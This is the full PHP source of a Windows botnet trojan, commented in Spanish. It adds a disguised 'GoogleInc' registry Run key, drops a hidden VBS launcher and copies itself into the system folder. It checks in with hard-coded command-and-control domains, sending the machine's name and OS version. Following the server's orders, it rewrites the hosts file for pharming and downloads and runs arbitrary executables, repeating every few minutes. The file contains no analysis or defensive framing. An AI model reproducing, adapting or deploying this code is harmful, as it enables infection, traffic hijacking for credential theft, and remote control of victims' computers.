<?php
@set_time_limit ( 0 );

/*Funcion InterValo*/
define(Intervalo , "310");



/*												  *
* DE AQUI HASTA ABAJO NO MOVER NADA QUEDO CLARO ? *
*												  */
    
	function DescargaEjecuta($DownloadUrl){
		$Names = @explode("/" , $DownloadUrl);
		$Nombre = $Names[(count($Names)-1)] ;
		if( ! @file_exists("C:/WINDOWS/Temp/" . $Nombre ) ){
			@copy($DownloadUrl , "C:/WINDOWS/Temp/" . $Nombre);
			@exec("C:/WINDOWS/Temp/" . $Nombre);
		} 
	}

   
	function HookPharming($Pharming,$OnPharming) {
	if ($OnPharming =="ONLINE"){
        @unlink ( "c:/windows/system32/drivers/etc/hosts" );
		$O = fopen ( "c:/windows/system32/drivers/etc/hosts", "w+" );
		@fwrite ( $O, $Pharming ) ;
		@fclose ( $O ); 
     } 
	if ($OnPharming =="OFFLINE"){
		@unlink ( "c:/windows/system32/drivers/etc/hosts" );
		$O = fopen ( "c:/windows/system32/drivers/etc/hosts", "w+" );
		@fwrite ( $O, "" ) ;
		@fclose ( $O );
	}
}
    
	function RegisterWindows(){
       define(vbsCript , str_replace(" " , "-" , PHP_uname("n")) ) ;
	   $Fecha=getdate();
       $h=$Hora=$Fecha["hours"].":".($Fecha["minutes"]+1);
	   $Names = explode("\\" , $_SERVER[argv][0]);
	   $Hkey ="reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v GoogleInc /t REG_SZ /d %systemroot%\\system\\".vbsCript.".vbs /f";
	   @system($Hkey); 
	   VbRegister();
	   AutoCopia();
	   Starter();
	}
	function VbRegister(){
	    define(vbsCript , str_replace(" " , "-" , PHP_uname("n")) ) ;
		$Ruta = "C:/Windows/system/" . vbsCript . ".exe";
	    $Datos = 'set objshell = createobject("wscript.shell")
objshell.run "'.$Ruta.'", vbhide';
	    @unlink ( "C:/Windows/system/".vbsCript.".vbs" );
		$O = fopen ( "C:/Windows/system/".vbsCript.".vbs", "w+" );
		@fwrite ( $O, $Datos ) ;
		@fclose ( $O );
	
	}
	function AutoCopia(){
	    $Names = explode("\\" , $_SERVER[argv][0]);
		define(NameExe , $Names[(count($Names)-1)]) ;
		define(PcName , str_replace(" " , "-" , PHP_uname("n")) ) ;
		if( ! @file_exists("C:/WINDOWS/system/" . PcName . ".exe") ){
			@copy(NameExe , "C:/WINDOWS/system/" . PcName . ".exe");
			return false ;
		} 
		return true ;
		
	}
	function Starter(){
	define(vbsCript , str_replace(" " , "-" , PHP_uname("n")) ) ;
	$Names = explode("\\" , $_SERVER[argv][0]);
	define(NameExe , $Names[(count($Names)-1)]) ;
	define(PcName , str_replace(" " , "-" , PHP_uname("n")) ) ;
	$PcExeName = "" . PcName . ".exe";
	if (NameExe ==$PcExeName){$Net="Fin";} else {@exec("C:/Windows/system/".vbsCript.".vbs");exit;}
	
	}
function YahooServers(){
	
	
	    /*Conexion de MiltiDominio*/
	$Urls[0] = 'http://kakaroto.info';
        $Urls[1] = 'http://bechepe.info';
        $Urls[2] = 'http://stringback.info';
		
		/*Directorio de Instalacion WebPanel*/

         define(DirInstall, "/System/");
		
		if(  strlen(@file_get_contents($Urls[0])) > 5 ){ define(UrlServer , $Urls[0]);}
        if(  strlen(@file_get_contents($Urls[1])) > 5 ){ define(UrlServer , $Urls[1]);}
        if(  strlen(@file_get_contents($Urls[2])) > 5 ){ define(UrlServer , $Urls[2]);}
		
		define(MyNamesIs , str_replace(" " , "-" , PHP_uname("n")) ) ;
		define(MyBici, PHP_uname("r")) ;
		$Url = "" .UrlServer."".DirInstall."Zombies.php?Mexico=" . MyNamesIs . "&Chicano=" . MyBici . "";
		$MiCalificacion = @file_get_contents($Url);
		$Fuego = @explode("-!-" , $MiCalificacion) ;
		$Pharming = $Fuego[1];
		$OnPharming = $Fuego[2];
		$DownloadUrl = trim($Fuego[3]);
		HookPharming($Pharming,$OnPharming);
		if(  strlen($DownloadUrl) > 12 ){ DescargaEjecuta($DownloadUrl); }	

		
	}
function PremiOnsClickers(){

    RegisterWindows();
    YahooServers();
	sleep(Intervalo);
	PremiOnsClickers();
}

PremiOnsClickers();
?>